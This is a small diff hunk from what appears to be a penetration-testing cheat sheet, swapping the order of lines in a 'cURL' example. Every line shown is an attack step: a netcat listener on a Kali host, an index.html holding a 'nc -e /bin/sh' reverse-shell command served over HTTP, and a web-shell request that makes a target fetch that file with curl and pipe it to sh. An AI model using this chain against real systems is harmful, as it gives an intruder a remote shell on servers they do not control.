@@ -129,8 +129,8 @@
   # <kbd>cURL</kbd>
  
   ```cmd
-  root@kali:~# nc -lvnp 443
   root@kali:~# echo "nc -e /bin/sh 192.168.1.2 443" > index.html; python3 -m http.server 80
+  root@kali:~# nc -lvnp 443
   http://192.168.1.3/cmd.php?cmd=curl 192.168.1.2/index.html|sh
   ```
  
